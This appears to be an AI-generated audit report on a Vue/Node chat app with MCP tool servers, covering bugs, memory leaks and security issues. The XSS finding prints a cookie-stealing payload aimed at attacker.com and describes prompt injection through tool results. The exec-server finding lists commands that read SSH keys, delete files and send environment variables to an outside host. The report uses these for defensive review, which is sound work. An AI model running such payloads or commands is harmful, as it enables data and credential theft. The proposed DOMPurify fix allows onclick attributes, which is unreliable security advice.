# Paloma Codebase Audit — Self-Improvement Report
**Date:** 2026-03-21  
**Scout:** Deep audit across all layers — bridge, composables, components, MCP servers, scripts  
**Files read:** bridge/index.js, bridge/claude-cli.js, bridge/gemini-cli.js, bridge/ollama-manager.js, bridge/email-watcher.js, bridge/mcp-manager.js, bridge/pillar-manager.js (first 350 lines), bridge/mcp-proxy-server.js (first 200 lines), src/composables/useMCP.js, src/composables/useCliChat.js, src/composables/useChat.js, src/composables/useSessionState.js, src/composables/useSessions.js, src/services/mcpBridge.js, src/services/claudeStream.js, src/components/chat/MessageItem.vue, src/components/chat/ChatView.vue, src/components/layout/Sidebar.vue, mcp-servers/exec.js

---

## Critical Findings

---

### CRIT-1: Singularity callbacks silently broken in mcpBridge.js
**File:** `src/services/mcpBridge.js`  
**Category:** Quality / Bug  
**Severity:** Critical  

**What's wrong:**  
In `ws.onmessage`, three message types are handled:
```js
} else if (msg.type === 'singularity_created') {
  onSingularityCreated?.(msg)
} else if (msg.type === 'singularity_ready') {
  onSingularityReady?.(msg)
} else if (msg.type === 'singularity_complete') {
  onSingularityComplete?.(msg)
}
```
But `onSingularityCreated`, `onSingularityReady`, and `onSingularityComplete` are **never declared** as module-level `let` variables (unlike every other callback — `onPillarDone`, `onFlowNotificationStart`, etc. are all declared and assigned from the `callbacks` parameter in `connect()`). These variables are also never extracted from `callbacks` in the `connect()` function.

In ES modules (strict mode), referencing an undeclared variable throws `ReferenceError`. The browser's WebSocket error handler silently swallows it. Result: singularity groups are **never created in the useMCP.js reactive state**, the ThinkingPanel never updates, and singularity_groups stays empty.

**Suggested fix:**  
Add three `let` declarations near the top of `createMcpBridge()` (alongside `let onSupervisorRestart = null`):
```js
let onSingularityCreated = null
let onSingularityReady = null
let onSingularityComplete = null
```
Add three lines in `connect()` alongside the other callback extractions:
```js
onSingularityCreated = callbacks.onSingularityCreated || null
onSingularityReady = callbacks.onSingularityReady || null
onSingularityComplete = callbacks.onSingularityComplete || null
```

---

### CRIT-2: XSS via v-html + marked without sanitization
**File:** `src/components/chat/MessageItem.vue`, line ~180 (`renderedHtml` computed)  
**Category:** Security  
**Severity:** Critical  

**What's wrong:**  
`marked.parse(props.message.content, { breaks: true })` is rendered via `v-html` with no HTML sanitization. Since `marked` v4+, raw HTML in markdown is **passed through as-is** by default — the `sanitize` option was removed. A model response containing `<script>alert(1)</script>` or `<img src=x onerror=fetch('attacker.com/'+document.cookie)>` in markdown would execute in the browser.

Real attack vector: prompt injection via tool results. If a file read returns attacker-controlled content that the AI echoes verbatim in its markdown response (e.g., "Here is the file contents: ..."), the injected HTML executes.

**Suggested fix:**  
Install `dompurify` and sanitize the output:
```js
import DOMPurify from 'dompurify'
// in renderedHtml computed:
const dirty = html.replace(/<pre><code ... >/g, ...) // existing transform
return DOMPurify.sanitize(dirty, { FORCE_BODY: true, ADD_ATTR: ['onclick', 'data-code-index'] })
```
Or configure marked with `mangle: false` and wrap the result in DOMPurify before caching.

---

### CRIT-3: Watcher memory leak in MessageItem.vue
**File:** `src/components/chat/MessageItem.vue`, line ~152  
**Category:** Quality / Memory Leak  
**Severity:** High  

**What's wrong:**  
```js
const stopSessionWatch = watch(activeId, () => { htmlCache.clear() })
```
The return value of `watch()` (the stop function) is captured in `stopSessionWatch` but **never called**. There's no `onBeforeUnmount` hook to stop the watcher. Every `MessageItem` instance registers a watcher on `activeId` that persists in memory even after the component unmounts. In a long session with many messages, hundreds of these watchers accumulate.

**Suggested fix:**  
```js
import { onBeforeUnmount } from 'vue'
// at bottom of <script setup>:
onBeforeUnmount(stopSessionWatch)
```

---

## High Severity Findings

---

### HIGH-1: flowChatBuffers / cliRequestToWs can grow unboundedly
**File:** `bridge/index.js`, module scope  
**Category:** Quality / Memory Leak  
**Severity:** High  

**What's wrong:**  
`flowChatBuffers` and `cliRequestToWs` are `new Map()` instances populated when a chat stream starts. Both are cleaned up in the `claude_done`/`claude_error` event handlers. But if a claude process hangs (starts, never closes), these entries are **never removed**. Over time (especially with many pillar spawns), this accumulates. The `flowChatBuffers` map stores full streaming output text, so each leaked entry can be hundreds of KB.

**Suggested fix:**  
Add a periodic audit (e.g., every 10 minutes) that cross-references `flowChatBuffers` keys against `cliManager.processes` and removes entries whose request IDs no longer have a running process:
```js
setInterval(() => {
  for (const [reqId] of flowChatBuffers) {
    if (!cliManager.processes.has(reqId)) {
      console.warn('[bridge] Leaking flowChatBuffer for', reqId.slice(0, 8))
      flowChatBuffers.delete(reqId)
    }
  }
}, 10 * 60 * 1000)
```

---

### HIGH-2: MCP server crash is silent and permanent
**File:** `bridge/mcp-manager.js`, `callTool()` and `startServer()`  
**Category:** Quality / Resilience  
**Severity:** High  

**What's wrong:**  
MCP stdio servers are started once at bridge startup. If any server crashes (process exits, OOM, etc.), `callTool()` throws `Error: Server X is not connected`. The entry in `this.clients` stays with `status: 'connected'` but the transport is dead. There is no health check, no crash detection, no reconnect logic. Any tool call to the crashed server fails with an opaque error until the bridge is restarted manually.

This affects voice, memory, gmail, exec, web — any crash silently breaks that tool class.

**Suggested fix:**  
- Listen for `'close'` or `'error'` on the transport subprocess and mark status as 'error'
- Attempt reconnect with exponential backoff (3 retries)
- Broadcast `cli_tool_activity` error event to the browser so Adam sees it
```js
transport._process?.on('exit', (code) => {
  entry.status = 'error'
  entry.error = `Process exited with code ${code}`
  setTimeout(() => this._restartServer(name, config), 5000)
})
```

---

### HIGH-3: PillarManager cleanup interval not unref'd
**File:** `bridge/pillar-manager.js`, constructor  
**Category:** Quality / Bug  
**Severity:** High  

**What's wrong:**  
`OllamaManager` correctly calls `this._cleanupInterval.unref()` so the cleanup interval doesn't prevent Node.js from exiting. `PillarManager` does the same pattern:
```js
this._cleanupInterval = setInterval(() => this._cleanupTerminalSessions(), 5 * 60 * 1000)
```
But **does not call `.unref()`**. If the bridge is in the process of shutting down and something causes the event loop to drain, this interval keeps it alive. The `shutdown()` method should clear this, but if shutdown is called and the interval fires before the process exits, it could interfere.

**Suggested fix:**  
```js
this._cleanupInterval = setInterval(() => this._cleanupTerminalSessions(), 5 * 60 * 1000)
this._cleanupInterval.unref()
```
Also verify `shutdown()` calls `clearInterval(this._cleanupInterval)` — it currently doesn't appear to.

---

### HIGH-4: OllamaManager — stop() called mid-tool-execution leaves continuation orphaned
**File:** `bridge/ollama-manager.js`, `continueWithToolResults()` and `stop()`  
**Category:** Quality / Race Condition  
**Severity:** High  

**What's wrong:**  
When Ollama emits `ollama_tool_call`, the bridge removes the request from `this.requests` and executes the tools asynchronously. During that async window, if `stop(requestId)` is called (user clicks stop, or timeout), the entry is already gone from `this.requests` so the abort does nothing. When `continueWithToolResults()` is then called by the bridge, it creates a fresh `AbortController`, puts the requestId back in `this.requests`, and starts a new streaming round — completely ignoring the stop signal.

**Suggested fix:**  
Add a "cancelled" Set to track explicitly stopped request IDs:
```js
this._cancelled = new Set()

stop(requestId) {
  this._cancelled.add(requestId)
  const entry = this.requests.get(requestId)
  if (entry) { entry.abortController.abort(); this.requests.delete(requestId) }
}

continueWithToolResults(requestId, ...) {
  if (this._cancelled.has(requestId)) {
    this._cancelled.delete(requestId)
    onEvent({ type: 'ollama_done', requestId, sessionId, exitCode: 0 })
    return
  }
  // ... existing logic
}
```

---

### HIGH-5: _reconcilePillarSessions loads ALL sessions on every reconnect
**File:** `src/composables/useMCP.js`, `_reconcilePillarSessions()` and `_reregisterFlowSessions()`  
**Category:** Performance  
**Severity:** High  

**What's wrong:**  
Both `_reconcilePillarSessions()` and `_reregisterFlowSessions()` call `await db.sessions.toArray()` — a full table scan of every session in IndexedDB. This runs every time the bridge reconnects. After months of use, IndexedDB will have thousands of sessions. On a slow reconnect cycle (bridge restart in 3s), this could add noticeable latency to the reconnect path.

**Suggested fix:**  
Filter to recent sessions (last 7 days) or sessions with active pillarIds:
```js
// _reconcilePillarSessions:
const recentCutoff = Date.now() - 7 * 24 * 60 * 60 * 1000
const allSessions = await db.sessions
  .where('updatedAt').above(recentCutoff)
  .or('pillarId').notEqual(null)  // Dexie compound query or two fetches
  .toArray()
```

---

### HIGH-6: Gemini CLI temp dir cleanup uses sync ops at startup
**File:** `bridge/gemini-cli.js`, `_cleanupOrphanedDirs()`  
**Category:** Performance / Quality  
**Severity:** High  

**What's wrong:**  
```js
const dirs = readdirSync(tmp).filter(d => d.startsWith('paloma-gemini-'))
for (const dir of dirs) {
  try { rmSync(join(tmp, dir), { recursive: true, force: true }) } catch {}
}
```
`readdirSync` and `rmSync` are synchronous blocking calls running in the constructor. `/tmp` can contain thousands of entries. On a system where Gemini crashed previously and left many orphaned dirs, this blocks the Node.js event loop at bridge startup for a noticeable time.

**Suggested fix:**  
Convert to async:
```js
async _cleanupOrphanedDirs() {
  const { readdir, rm } = await import('node:fs/promises')
  const dirs = (await readdir(tmpdir())).filter(d => d.startsWith('paloma-gemini-'))
  await Promise.allSettled(dirs.map(d => rm(join(tmpdir(), d), { recursive: true, force: true })))
}
```
Call `this._cleanupOrphanedDirs()` from an async `init()` method rather than the constructor.

---

## Medium Severity Findings

---

### MED-1: exec.js "home directory restriction" is misleading
**File:** `mcp-servers/exec.js`, `handleExec()`  
**Category:** Security  
**Severity:** Medium  

**What's wrong:**  
The header comment says "Safety: commands are restricted to execute within the home directory." This only restricts the **working directory** (`cwd`), not the commands themselves. `rm -rf ~/important`, `cat ~/.ssh/id_rsa`, `curl attacker.com -d "$(env)"` all work regardless of cwd restriction. The actual safety gate is the bridge's browser confirmation system — but the misleading comment could lead someone to believe there's stronger sandboxing.

**Suggested fix:**  
Update the comment to accurately state: "The cwd is restricted to the home directory. Command content is unrestricted — the Paloma browser confirmation system is the actual security gate." Consider adding a denylist of especially dangerous patterns (e.g., `rm -rf /`, `chmod 777 /`, `curl | bash`) as an extra layer.

---

### MED-2: index.js WebSocket message handler is a 400-line monolith
**File:** `bridge/index.js`, `ws.on('message', ...)` handler  
**Category:** Developer Experience / Quality  
**Severity:** Medium  

**What's wrong:**  
The `ws.on('message')` handler is ~400 lines of nested if/else if chains covering 20+ message types. Each backend (claude, codex, copilot, gemini, ollama) has 3-5 nearly identical blocks for `_chat`, `_stop`, `_ack`. This is a maintenance risk: adding a new backend requires copy-pasting ~30 lines; bugs in one backend silently exist in others. No unit tests possible as-is.

**Suggested fix:**  
Extract a `handleBackendChat(backend, msg, ws)` function that covers the shared ack/event/stop pattern. Reduce all 5 backend chat handlers to 5 one-liners:
```js
} else if (msg.type === 'gemini_chat') {
  handleBackendChat('gemini', geminiManager, msg, ws)
}
```

---

### MED-3: resolve_path does recursive filesystem DFS in the WS message handler
**File:** `bridge/index.js`, `resolve_path` handler (~line 237)  
**Category:** Performance  
**Severity:** Medium  

**What's wrong:**  
The `resolve_path` message handler does a 3-level deep recursive `readdir()` search of `$HOME` to find a project directory by name. On first call with a large home directory, this could scan hundreds of directories before finding the match (or not). This runs in the WebSocket message handler — other messages are blocked until it completes. Awaiting is fine for async I/O but the search could issue hundreds of concurrent `readdir` calls via recursion without backpressure.

**Suggested fix:**  
Cache resolved paths in a `Map<string, string>` with a TTL (e.g., 60 seconds). Most calls are for the same project path. This turns the expensive search into a near-instant lookup on subsequent calls.

---

### MED-4: buildSystemPrompt rebuilt on every sendMessage in CLI path
**File:** `src/composables/useCliChat.js`, `runCliChat()`, around line 50  
**Category:** Performance  
**Severity:** Medium  

**What's wrong:**  
```js
systemPrompt: existingCliSession || isDirectCliModel(model)
  ? undefined
  : useOllama ? buildOllamaSystemPrompt(phase, projectInstructions)
    : buildSystemPrompt(phase, projectInstructions, activePlans, [], roots)
```
`buildSystemPrompt()` concatenates roots (8 files), active plans (up to 5 large files), and project instructions on every call. For resumed sessions (`existingCliSession` is truthy), `systemPrompt` is `undefined` so it's not wasted. But on the FIRST send to a new session (or after backend switch), it runs. Given plans can be 50KB+, this string concat happens synchronously on the hot path. For Ollama specifically, `buildOllamaSystemPrompt` runs even on resumed sessions... wait, actually `existingCliSession` check happens first. This is fine for resumes. But `useChat.js` also calls `buildSystemPrompt` for the OpenRouter path, passing it into `apiMessages`. So there are two separate system prompt builds in play.

**Suggested fix:**  
Memoize `buildSystemPrompt` with a cache key based on `phase + activePlans.length + (hash of projectInstructions)`. Invalidate when `activePlans` changes. This prevents rebuilding the same 100KB string on every message in multi-turn OpenRouter sessions.

---

### MED-5: pillar_queued event silently swallowed in browser UI
**File:** `src/services/mcpBridge.js`, `ws.onmessage`  
**Category:** UX  
**Severity:** Medium  

**What's wrong:**  
```js
} else if (msg.type === 'pillar_queued') {
  console.log(`[pillar] ${msg.pillar} queued (position ${msg.queuePosition})`)
}
```
Queued pillars are logged to console only. The user sees nothing in the UI — no status indicator, no queue position, no estimated wait. If Adam spawns a 5th Ollama pillar and it gets queued, the sidebar shows nothing for it until it starts running. This is confusing — it looks like the spawn failed silently.

**Suggested fix:**  
Expose `pillarQueued` state in `useMCP.js`:
```js
const pillarQueuedPositions = reactive(new Map()) // pillarId → queuePosition

// in onmessage:
onPillarQueued?.(msg)

// in mcpBridge connect():
onPillarQueued = callbacks.onPillarQueued || null

// in useMCP.js:
onPillarQueued(msg) {
  pillarStatuses.set(msg.pillarId, 'queued')
  pillarQueuedPositions.set(msg.pillarId, msg.queuePosition)
}
```
Add a "queued" visual state to `SidebarSessionTree` — e.g., a clock icon with queue position.

---

### MED-6: Email watcher uses `'opus'` model shorthand — may not resolve correctly
**File:** `bridge/email-watcher.js`, `_spawnEmailSession()` and `_sendContinuityEmail()`  
**Category:** Quality / Bug Risk  
**Severity:** Medium  

**What's wrong:**  
```js
const { requestId, sessionId } = this.cliManager.chat(
  { prompt, model: 'opus' },  // ← shorthand, not a full CLI model ID
  ...
)
```
`ClaudeCliManager.chat()` passes `model` directly to the `claude` CLI as `--model opus`. This works today because Claude CLI accepts short names. But it bypasses the `getCliModelName()` resolution logic used everywhere else in the codebase. If the Claude CLI changes its model name resolution, email sessions silently fail. All other code paths use `claude-cli:opus` and route through `claudeStream.js` resolution.

**Suggested fix:**  
Use the resolved model name consistently: `model: 'claude-opus-4-6'` or create a constant `EMAIL_MODEL = 'claude-opus-4-6'` at the top of email-watcher.js and document why.

---

### MED-7: ChatView.vue auto-resume sends generic message, not original prompt
**File:** `src/components/chat/ChatView.vue`, `pendingAutoResume` watcher  
**Category:** UX / Quality  
**Severity:** Medium  

**What's wrong:**  
```js
const title = await sendMessage(
  props.session.id,
  'Please continue where you left off.',  // ← generic placeholder
  ...
)
```
When the bridge restarts mid-conversation and auto-resumes, it sends "Please continue where you left off." This shows up in the chat history as a user message, which is confusing (Adam didn't type that). It also gives the model no context about what "where it left off" means since CLI sessions aren't resumed by session ID here — it's actually starting fresh with the prior context.

**Suggested fix:**  
Use the actual last user message content for the resume, and mark it as auto-generated:
```js
const content = lastUserMsg.content
// ... send the actual content
```
Or better: check if `session.cliSessionId` is still valid and resume that session rather than starting a new prompt.

---

### MED-8: htmlCache in MessageItem.vue: stale entries survive session switches
**File:** `src/components/chat/MessageItem.vue`, ~line 150  
**Category:** Performance / Memory  
**Severity:** Medium  

**What's wrong:**  
The `htmlCache` in MessageItem is a module-level `Map` shared across ALL MessageItem instances (because it's defined in the module, not in `setup()`). The watcher on `activeId` calls `htmlCache.clear()` on session switch — but due to the watcher leak (CRIT-3), this also doesn't work on unmounted instances. Additionally, with the LRU cap at 300 entries, a session with >300 assistant messages leaks old rendered HTML from previous messages it evicted.

More importantly: since `htmlCache` is module-level, ALL rendered HTML for ALL sessions shares the same 300-entry pool. This means switching between sessions with many messages causes constant cache thrashing.

**Suggested fix:**  
Move `htmlCache` from module scope into `setup()` so each component instance has its own cache. This is correct ownership: one cache per message item, not shared globally.

---

## Low Severity / UX Polish Findings

---

### LOW-1: Sidebar missing aria labels for key interactive elements
**File:** `src/components/layout/Sidebar.vue`  
**Category:** UX / Accessibility  
**Severity:** Low  

**What's wrong:**  
The "New Chat" button and "Export Chats" button have visible text but no `aria-label`. Screen readers would read them correctly from text content, but the SVG icons have no `aria-hidden="true"` to prevent screen readers from announcing the SVG paths. The resize handle (if any) likely has no accessible label.

**Suggested fix:**  
Add `aria-hidden="true"` to all inline SVG icons that are decorative (have adjacent text). Verify the export button shows a success/error toast — the current implementation only updates button text, which screen readers won't re-announce.

---

### LOW-2: Copy button in code blocks uses inline onclick — CSP incompatibility
**File:** `src/components/chat/MessageItem.vue`, `renderedHtml` computed, ~line 200  
**Category:** Security / DX  
**Severity:** Low  

**What's wrong:**  
```js
const copyOnclick = `navigator.clipboard.writeText(...).then(...)...`
return `...<button class="copy-btn" onclick="${copyOnclick}">Copy</button>...`
```
The copy button uses an `onclick="..."` inline event handler injected into the `v-html` string. This is incompatible with strict Content Security Policy (CSP) headers (requires `unsafe-inline` for scripts). It also means the onclick string is re-evaluated as JavaScript each time, and any future escaping issue in the content string could become a security vector.

**Suggested fix:**  
Use event delegation via `@click` on the container (already done for `.apply-btn`), or better: move the copy button out of the `v-html` rendered region entirely and render it as a Vue component alongside the code block.

---

### LOW-3: Tool confirmation queue has no size limit
**File:** `src/composables/useMCP.js`, `cliToolConfirmationQueue`  
**Category:** Quality  
**Severity:** Low  

**What's wrong:**  
```js
const cliToolConfirmationQueue = []  // no size limit
...
cliToolConfirmationQueue.push({ id, toolName, args })
```
If many concurrent tool calls arrive (e.g., during a heavily-parallel Forge session), the confirmation queue can grow arbitrarily. While this is unlikely to OOM, if Adam is away and hundreds of tool calls stack up, the queue becomes unmanageable — each requires a manual approval click.

**Suggested fix:**  
Add a cap (e.g., 50 entries). When exceeded, auto-deny oldest entries with `"Queue full — auto-denied"` and log a warning. Or show a "Deny all queued tools" button in the UI.

---

### LOW-4: useSessions: sessionTree computed prop does full O(n²) scan
**File:** `src/composables/useSessions.js`, `sessionTree` computed  
**Category:** Performance  
**Severity:** Low  

**What's wrong:**  
```js
const parentIds = new Set(sessions.value.map(s => s.id))
for (const session of sessions.value) {
  if (session.parentFlowSessionId && parentIds.has(session.parentFlowSessionId)) {
    ...
  }
}
```
The outer loop is O(n) and the inner operations are O(1) with the Set — this is actually O(n) total, not O(n²). But the computed re-runs on every mutation to `sessions.value`. If `sessions` is a reactive ref with `.value = result` (array reassignment), the entire computed re-runs on every `loadSessions()` call, including minor updates from `updateSession()`. 

`updateSession()` calls `await loadSessions(projectPath)` indirectly... actually it doesn't. It calls `db.sessions.update()` and then mutates the local array with `Object.assign`. That's fine. But `deleteSession()` calls `loadSessions()` which reassigns `sessions.value = result`, triggering a full recompute.

With hundreds of sessions, the `sessionTree` computed runs on every delete/create, which involves multiple `.map()` and `.filter()` passes over the entire array.

**Suggested fix:**  
This is low priority today but worth noting for when the session count grows. Consider debouncing `sessionTree` recomputation or using Dexie's `liveQuery` for incremental updates.

---

### LOW-5: GeminiCliManager sessions never cleaned up from `this.processes`
**File:** `bridge/gemini-cli.js`, `chat()` method  
**Category:** Quality / Minor Memory Leak  
**Severity:** Low  

**What's wrong:**  
When `chat()` is called with an existing `sessionId` for resume, the new `requestId` is stored in `this.processes`. When the process closes, it cleans up. But the initial `sessionId` passed in is never stored in the map — only `requestId` is the key. So `this.processes.size` grows monotonically with each new resume request until process close. This is correct behavior, but unlike `ClaudeCliManager` there's no explicit cleanup on error outside the `proc.on('close')` handler.

If `proc.on('error')` fires without a subsequent `close` event (which CAN happen), the entry `this.processes.get(requestId)` would never be deleted. The `sessionDir` temp directory would also never be cleaned up.

**Suggested fix:**  
In the `proc.on('error')` handler, add the same cleanup as `close`:
```js
proc.on('error', (err) => {
  console.error(`[gemini] Process error: ${err.message}`)
  try { rmSync(sessionDir, { recursive: true, force: true }) } catch {}
  this.processes.delete(requestId)  // ← already done
  onEvent({ type: 'gemini_error', requestId, error: err.message })
})
```
Actually looking at the code this IS already done. But it's missing `entry.sessionDir` cleanup via the `this.processes.get(requestId)` path (like `close` does). Minor inconsistency only.

---

### LOW-6: Email watcher thread tracker never cleaned up on shutdown
**File:** `bridge/email-watcher.js`, `shutdown()`  
**Category:** Quality  
**Severity:** Low  

**What's wrong:**  
`shutdown()` correctly clears `clearInterval(this.interval)`, `clearTimeout(this.dailyTimeout)`, `clearInterval(this.dailyInterval)`, and all `threadTracker` retry timers. **However**, `this.seenIds` (a Set) and `this.threadTracker` (a Map with `requestId` entries) are not cleared. The `cliManager` processes referenced by `entry.requestId` are also not stopped — shutdown stops the email watcher but doesn't kill any actively-running email session Claude processes.

**Suggested fix:**  
In `shutdown()`, after clearing timers:
```js
// Stop any active email session processes
for (const [, entry] of this.threadTracker) {
  if (entry.requestId) {
    try { this.cliManager.stop(entry.requestId) } catch {}
  }
}
this.threadTracker.clear()
this.seenIds.clear()
```

---

### LOW-7: Package.json has no "engines" field — silent version mismatch
**File:** `package.json`  
**Category:** Developer Experience  
**Severity:** Low  

**What's wrong:**  
The project uses ES module syntax, top-level await in MCP servers, and Node.js 22 features (per the universal installer plan). However, `package.json` has no `"engines"` field. Running on Node 18 or 20 would silently fail at runtime rather than giving a clear error at install time.

**Suggested fix:**  
```json
"engines": {
  "node": ">=22.0.0"
}
```

---

### LOW-8: pillarStreamBuffer can grow unboundedly for stuck pillars
**File:** `src/composables/useMCP.js`, `pillarStreamBuffer` Map  
**Category:** Quality / Memory  
**Severity:** Low  

**What's wrong:**  
`pillarStreamBuffer` buffers stream events that arrive before `onPillarSessionCreated` completes. The buffer is drained in `onPillarSessionCreated` (after session creation) and deleted in `onPillarDone` for terminal states. But if `onPillarSessionCreated` never fires (bridge disconnect during the session creation async window), the buffer accumulates events indefinitely. There's no TTL or size cap.

**Suggested fix:**  
Cap the buffer at 1000 events per pillarId:
```js
if (!pillarStreamBuffer.has(pillarId)) {
  pillarStreamBuffer.set(pillarId, [])
}
const buf = pillarStreamBuffer.get(pillarId)
if (buf.length < 1000) buf.push({ event, backend })
```
Also add a cleanup pass in `_reconcilePillarSessions()` for pillarIds not in activePillarIds.

---

### LOW-9: Missing loading state for initial message load in ChatView
**File:** `src/components/chat/ChatView.vue` + `src/composables/useChat.js`  
**Category:** UX  
**Severity:** Low  

**What's wrong:**  
`loadMessages(sessionId)` is called in a `watch` on `session.id`. During the async DB fetch (`await db.messages...`), the UI shows an empty message list with no loading indicator. For sessions with hundreds of messages, this creates a flash of empty content that looks like the session is blank.

**Suggested fix:**  
Add a `loading` ref to `useChat.js`:
```js
const loading = ref(false)
async function loadMessages(sessionId) {
  loading.value = true
  ...
  loading.value = false
}
```
In `MessageList.vue`, show a spinner or skeleton when `loading` is true.

---

### LOW-10: Duplicate XSS sanitization comment vs. actual behavior on copy button
**File:** `src/components/chat/MessageItem.vue`, ~line 200  
**Category:** Developer Experience  
**Severity:** Low  

**What's wrong:**  
The copy button's `onclick` attribute is generated from a string literal that contains JavaScript. The `${copyOnclick}` interpolation doesn't escape HTML attributes, so if any part of the template string contained `"` characters, it would break the attribute string. Currently it doesn't — but the pattern of building HTML strings with embedded JS is fragile.

The real issue: the `Apply` button's `data-code-index="${index}"` is fine — index is always an integer. The `Copy` button's inline code is fixed — it never contains user input. But the pattern misleads future maintainers about whether escaping is needed.

---

## Developer Experience Findings

---

### DX-1: No unit tests for any bridge or composable code
**Category:** Developer Experience  
**Severity:** Medium  

**What's wrong:**  
There are no test files anywhere in the codebase (`*.test.js`, `*.spec.js`, `__tests__/`). Critical logic like `_extractJsonObjects()`, `_parseXmlToolCalls()`, `buildSystemPrompt()`, pillar lifecycle, and the MCP proxy confirmation flow has no automated coverage. The Ollama eval scripts exist but test the AI model, not the infrastructure.

**Suggested fix:**  
Start with the most complex, isolated utility: `ollama-manager.js`'s `_extractJsonObjects()` and `_parseXmlToolCalls()` — these are pure functions with defined inputs/outputs. Add a `vitest` (or plain `node:test`) runner for bridge utilities. The goal isn't 80% coverage immediately — just a foundation so regressions are caught.

---

### DX-2: OLLAMA_ALLOWED_SERVERS defined in pillar-manager.js but used in bridge/index.js
**File:** `bridge/pillar-manager.js` + `bridge/index.js`  
**Category:** Developer Experience  
**Severity:** Low  

**What's wrong:**  
`OLLAMA_ALLOWED_SERVERS` is exported from `pillar-manager.js` and imported into `bridge/index.js` for the browser-side Ollama tool filtering. This is an odd coupling — the allowed server list is conceptually a configuration constant, not a PillarManager concern. Both the browser path (index.js) and the pillar path (pillar-manager.js) use the same set, which is good, but the ownership is unclear.

**Suggested fix:**  
Move `OLLAMA_ALLOWED_SERVERS` to `bridge/config.js` (where `loadConfig()` already lives) and import from there in both places.

---

### DX-3: bridge/index.js constructs all manager instances at module load time
**File:** `bridge/index.js`, module scope  
**Category:** Developer Experience  
**Severity:** Low  

**What's wrong:**  
```js
const manager = new McpManager()
const cliManager = new ClaudeCliManager()
const codexManager = new CodexCliManager()
...
```
All managers are constructed at module scope, before `main()` runs. This means constructor side effects (like GeminiCliManager's sync `_cleanupOrphanedDirs()`) run before any error handling or logging is set up. It also means the managers can't be easily mocked or substituted in tests.

**Suggested fix:**  
Move all `new XManager()` calls inside `main()` so construction is deferred and occurs within the async error boundary.

---

## Summary

| ID | Severity | Category | File | Issue |
|----|----------|----------|------|-------|
| CRIT-1 | Critical | Bug | mcpBridge.js | Singularity callbacks undeclared — ReferenceError silently breaks ThinkingPanel |
| CRIT-2 | Critical | Security | MessageItem.vue | XSS via v-html + marked without DOMPurify |
| CRIT-3 | High | Memory Leak | MessageItem.vue | watcher stopSessionWatch never called |
| HIGH-1 | High | Memory Leak | bridge/index.js | flowChatBuffers / cliRequestToWs unbounded |
| HIGH-2 | High | Resilience | mcp-manager.js | No reconnect on MCP server crash |
| HIGH-3 | High | Bug | pillar-manager.js | _cleanupInterval not unref'd |
| HIGH-4 | High | Race Condition | ollama-manager.js | stop() during tool execution continues anyway |
| HIGH-5 | High | Performance | useMCP.js | db.sessions.toArray() on every reconnect |
| HIGH-6 | High | Performance | gemini-cli.js | Sync fs ops (readdirSync/rmSync) blocking startup |
| MED-1 | Medium | Security | exec.js | Misleading "home dir restricted" comment — only cwd, not commands |
| MED-2 | Medium | DX | bridge/index.js | 400-line monolith WS message handler |
| MED-3 | Medium | Performance | bridge/index.js | Recursive DFS for resolve_path in WS handler, no cache |
| MED-4 | Medium | Performance | useCliChat.js | buildSystemPrompt() rebuilt every sendMessage |
| MED-5 | Medium | UX | mcpBridge.js | pillar_queued events not surfaced in UI |
| MED-6 | Medium | Bug Risk | email-watcher.js | 'opus' shorthand bypasses model resolution |
| MED-7 | Medium | UX | ChatView.vue | Auto-resume sends generic placeholder, not actual message |
| MED-8 | Medium | Memory | MessageItem.vue | module-level htmlCache shared across all instances |
| LOW-1 | Low | Accessibility | Sidebar.vue | SVG icons not aria-hidden |
| LOW-2 | Low | Security | MessageItem.vue | inline onclick incompatible with CSP |
| LOW-3 | Low | Quality | useMCP.js | Tool confirmation queue has no size limit |
| LOW-4 | Low | Performance | useSessions.js | sessionTree recomputes on every session mutation |
| LOW-5 | Low | Memory | gemini-cli.js | Minor leak if error fires without close |
| LOW-6 | Low | Quality | email-watcher.js | Active email CLI sessions not stopped on shutdown |
| LOW-7 | Low | DX | package.json | No "engines" field for Node version enforcement |
| LOW-8 | Low | Memory | useMCP.js | pillarStreamBuffer no TTL or size cap |
| LOW-9 | Low | UX | ChatView.vue | No loading state during message fetch |
| LOW-10 | Low | DX | MessageItem.vue | Fragile inline JS string template pattern |
| DX-1 | Medium | DX | everywhere | Zero unit tests for bridge/composable logic |
| DX-2 | Low | DX | pillar-manager.js | OLLAMA_ALLOWED_SERVERS owned in wrong file |
| DX-3 | Low | DX | bridge/index.js | Manager instances at module scope vs inside main() |

---

## Recommended Action Order

**Ship immediately (bugs that break existing features):**
1. CRIT-1: Wire singularity callbacks in mcpBridge.js — 10-line fix, breaks ThinkingPanel
2. CRIT-3: Add `onBeforeUnmount(stopSessionWatch)` in MessageItem.vue — 2-line fix

**Ship soon (security + data integrity):**
3. CRIT-2: Add DOMPurify sanitization to rendered markdown
4. HIGH-4: Add `_cancelled` Set to OllamaManager to prevent ghost continuations
5. HIGH-3: Unref PillarManager cleanup interval

**Next sprint (performance + resilience):**
6. HIGH-2: MCP server crash detection and reconnect
7. HIGH-5: Filter `db.sessions.toArray()` on reconnect
8. HIGH-6: Async cleanup in GeminiCliManager constructor
9. MED-5: Surface pillar_queued state in UI sidebar
10. MED-7: Fix auto-resume to use actual last message content

---

*Research complete. Findings are ready for Chart (if planning needed) or directly for Forge.*
